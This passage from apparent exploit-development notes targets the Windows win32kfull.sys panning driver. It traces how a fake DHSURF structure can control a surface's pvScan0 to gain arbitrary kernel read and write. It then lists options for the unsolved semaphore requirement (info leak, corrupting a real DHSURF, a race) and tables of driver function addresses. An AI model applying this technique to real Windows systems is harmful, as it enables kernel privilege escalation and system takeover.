        → vLockBmp2AndPrepareForPunt
            → dhsurf = SURFOBJ->dhsurf (our user-mode pointer)
            → EngAcquireSemaphore(*(dhsurf+0x20) + 0x308)  [requires valid HSEMAPHORE]
            → EngModifySurface(hsurf, hdev, 0, 0, dhsurf,
                               *(dhsurf+0x08),  ← CONTROLLED pvScan0
                               *(dhsurf+0x10),  ← CONTROLLED lDelta
                               NULL)
            → SURFACE->pvScan0 = our controlled value
    ↓
[User] GetBitmapBits(hbm, N, buf) → reads from controlled kernel address
[User] SetBitmapBits(hbm, N, buf) → writes to controlled kernel address
    ↓
Arbitrary Kernel Read/Write achieved
```

### Remaining Challenge

The `FakeDHSURF.pPANDEV` (at offset 0x20) must point to a structure containing a valid HSEMAPHORE at offset 0x308. This kernel semaphore handle is needed for `EngAcquireSemaphore` before `EngModifySurface` is called. Options:

1. **Info leak first**: Use a separate vulnerability to leak the PANDEV kernel address, then point `dhsurf+0x20` to the real PANDEV (which has valid HDEV at +0x30 and HSEMAPHORE at +0x308)
2. **Reuse existing surface**: Create a legitimate device bitmap first (via the PAN DC), leak its DHSURF kernel address, then corrupt the DHSURF contents
3. **Race condition**: Swap the DHSURF pointer between a legitimate and fake one between the iType check and the EngModifySurface call

---

## Addresses Reference (win32kfull.sys, imagebase 0x1C0000000)

| Symbol | RVA | Address |
|---|---|---|
| PanEnablePDEV | 0x294B80 | 0x1C0294B80 |
| PanBitBlt | 0x294720 | 0x1C0294720 |
| PanCopyBits | 0x294990 | 0x1C0294990 |
| PanEnableSurface | 0x294EC0 | 0x1C0294EC0 |
| PanDisablePDEV | 0x2949E0 | 0x1C02949E0 |
| PanDisableSurface | 0x294A30 | 0x1C0294A30 |
| PanCompletePDEV | 0x294930 | 0x1C0294930 |
| PanStretchBlt | 0x2956D0 | 0x1C02956D0 |
| PanAlphaBlend | 0x2945A0 | 0x1C02945A0 |
| PanTransparentBlt | 0x295E70 | 0x1C0295E70 |
| PanGradientFill | 0x295200 | 0x1C0295200 |
| PanStrokePath | 0x2959C0 | 0x1C02959C0 |
| PanStrokeAndFillPath | 0x295830 | 0x1C0295830 |
| PanTextOut | 0x295D10 | 0x1C0295D10 |
| PanningGetFunctionTable | 0x297340 | 0x1C0297340 |
| GetPanCopyBits | 0x297330 | 0x1C0297330 |
| gadrvfnPanning | 0x32F7A0 | 0x1C032F7A0 |
| MULTIPANSURFLOCK ctor | 0x294214 | 0x1C0294214 |
| MULTIPANSURFLOCK dtor | 0x2944A4 | 0x1C02944A4 |
| PANSURFLOCK ctor | 0x29440C | 0x1C029440C |
| PANSURFLOCK dtor | 0x29453C | 0x1C029453C |
| vLockBmp1AndPrepareForPunt | 0x296658 | 0x1C0296658 |
| vLockBmp2AndPrepareForPunt | 0x29672C | 0x1C029672C |
| vLockBmpAndPrepareForPunt | 0x296804 | 0x1C0296804 |
| vLockShadow (PANSURFLOCK) | 0x2968BC | 0x1C02968BC |
| vLockShadowW (MULTIPANSURFLOCK) | 0x296B44 | 0x1C0296B44 |
| bTryLockShadowR | 0x29630C | 0x1C029630C |
| vPanningUpdate | 0x296DE0 | 0x1C0296DE0 |
| bCreateSemaphores | 0x2961A0 | 0x1C02961A0 |
| vDeleteSemaphores | 0x2965B8 | 0x1C02965B8 |
| EngBitBlt | 0x00CB280 | 0x1C00CB280 |
| SimBitBlt | 0x277EB8 | 0x1C0277EB8 |
| SURFACE::pfnBitBlt | 0x00B9DA0 | 0x1C00B9DA0 |
| BltLnk | 0x00CCF10 | 0x1C00CCF10 |
| MulBitBlt | 0x2A1750 | 0x1C02A1750 |
| NtGdiBitBlt | 0x0084DE0 | 0x1C0084DE0 |
| NtGdiBitBltInternal | 0x0088600 | 0x1C0088600 |
| NtGdiEngBitBlt | 0x013B6A0 | 0x1C013B6A0 |
| NtGdiEngCreateDeviceBitmap | 0x2B2310 | 0x1C02B2310 |

## Addresses Reference (win32kbase.sys)

| Symbol | Address |
|---|---|
| PDEVOBJ::PDEVOBJ (LDEV ctor) | 0x1C00B9020 |
| PDEVOBJ::PDEVOBJ (HDEV clone) | 0x1C013D500 |
| PDEVOBJ::EnablePDEV | 0x1C00AB130 |
| hCreateHDEV | 0x1C0014AC8 |
| DrvCreateMDEV | 0x1C00128E8 |
| DrvChangeDisplaySettingsInternal | 0x1C0013A90 |
| NtUserChangeDisplaySettings | 0x1C0018E30 |
| DrvGetDriverCapableOverRide | 0x1C0015404 |
| DrvGetDriverAccelerationsLevel | 0x1C0015524 |
| ldevFillTable | 0x1C00A7BB8 |
| bFillFunctionTable | 0x1C00A7C68 |
| MulEnablePDEV | 0x1C0141930 |
| StubDispEnablePDEV | 0x1C007B8A0 |
